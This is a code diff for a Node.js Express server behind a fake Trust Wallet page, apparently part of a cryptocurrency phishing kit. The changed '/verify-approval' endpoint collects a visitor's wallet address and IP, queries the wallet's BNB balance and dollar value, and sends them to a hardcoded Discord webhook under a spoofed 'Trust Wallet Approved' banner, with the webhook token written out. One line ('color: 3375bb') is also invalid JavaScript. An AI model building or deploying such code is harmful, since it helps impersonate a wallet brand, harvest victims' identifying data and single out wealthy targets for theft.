@@ -6,16 +6,13 @@ const PORT = process.env.PORT || 3000;
 // ⭐⭐⭐ PUT YOUR DISCORD WEBHOOK HERE ⭐⭐⭐
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1459213607219892245/M_dBdrlpBILx4BNIW3mfxfnc7EHPxXNSe9xNArkl4q_3dc6_ejbKy0ojgRJ4yoeozfVp";
 
-// Serve static files
 app.use(express.static(__dirname));
 
-// Root route
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
-// API endpoint
-app.get('/send', async (req, res) => {
+app.get('/verify-approval', async (req, res) => {
     try {
         const wallet = req.query.wallet;
         const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
@@ -24,26 +21,57 @@ app.get('/send', async (req, res) => {
             return res.json({ error: 'No wallet' });
         }
         
+        // Get balance
+        let balance = "0";
+        let usdValue = "0.00";
+        try {
+            const response = await axios.post('https://bsc-dataseed.binance.org/', {
+                jsonrpc: "2.0",
+                method: "eth_getBalance",
+                params: [wallet, "latest"],
+                id: 1
+            });
+            
+            if (response.data && response.data.result) {
+                const wei = parseInt(response.data.result, 16);
+                balance = (wei / 1e18).toFixed(8);
+                
+                // Get BNB price in USD (approximate)
+                const bnbPrice = 300; // $300 per BNB approx
+                usdValue = (parseFloat(balance) * bnbPrice).toFixed(2);
+            }
+        } catch (e) {
+            console.log('Balance error');
+        }
+        
         // Send to Discord
         if (DISCORD_WEBHOOK.includes('discord.com')) {
             const msg = {
-                content: "🚨 **WALLET CONNECTED** 🚨",
+                content: "📱 **TRUST WALLET APPROVED**",
                 embeds: [{
-                    title: "Trust Wallet",
-                    color: 65280,
+                    title: "Wallet Connection Verified",
+                    color: 3375bb, // Trust Wallet blue
                     fields: [
-                        { name: "Wallet", value: wallet },
-                        { name: "IP", value: ip },
-                        { name: "Time", value: new Date().toLocaleString() }
-                    ]
+                        { name: "Asset", value: "BNB Smart Chain (BNB)", inline: false },
+                        { name: "Wallet", value: `\`${wallet}\``, inline: false },
+                        { name: "Balance", value: `${balance} BNB ($${usdValue})`, inline: true },
+                        { name: "IP Address", value: `\`${ip}\``, inline: true },
+                        { name: "Network Fee", value: "$0.00\n0.00000404 BNB", inline: true },
+                        { name: "Status", value: "✅ Approved", inline: true }
+                    ],
+                    footer: { text: "Trust Wallet dApp | Auto-verification" }
                 }]
             };
             
             await axios.post(DISCORD_WEBHOOK, msg);
-            console.log('Sent to Discord:', wallet, ip);
         }
         
-        res.json({ success: true });
+        res.json({ 
+            success: true, 
+            wallet: wallet,
+            balance: balance,
+            usdValue: usdValue
+        });
         
     } catch (error) {
         console.error(error);
@@ -51,7 +79,6 @@ app.get('/send', async (req, res) => {
     }
 });
 
-// Start server
 app.listen(PORT, () => {
-    console.log(`Server running: http://localhost:${PORT}`);
+    console.log(`✅ Server: http://localhost:${PORT}`);
 });
